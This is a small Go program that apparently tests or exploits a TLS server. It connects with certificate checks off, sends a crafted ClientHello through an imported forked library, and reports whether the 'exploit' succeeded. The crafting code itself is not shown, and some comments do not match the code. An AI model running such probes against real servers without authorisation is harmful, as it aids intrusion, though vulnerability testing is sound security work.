package main

import (
	"flag"
	"os"

	"github.com/mwfong-csl/crafted-clienthello/tls"
)

func main() {
	host := flag.String("host", "", "host:port to connect to")
	servername := flag.String("sni", "", "servername")
	flag.Parse()
	// Connect to the target, forcing TLSv1.2
	conn, err := tls.Dial("tcp", *host, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         *servername,
	})
	if err != nil {
		println("failed to connect: " + err.Error())
		os.Exit(1)
	}
	defer conn.Close()
	println("connected")
	// Send a crafted ClientHello SSL packet
	if err := conn.Handshake(); err != nil && err.Error() == "tls: handshake failure" {
		println("server is not vulnerable, exploit failed")
	} else if err != nil {
		println("handshake failed: " + err.Error())
	} else {
		println("handshake successful")
	}
}

// Local Variables:
// tab-width: 4
// End:
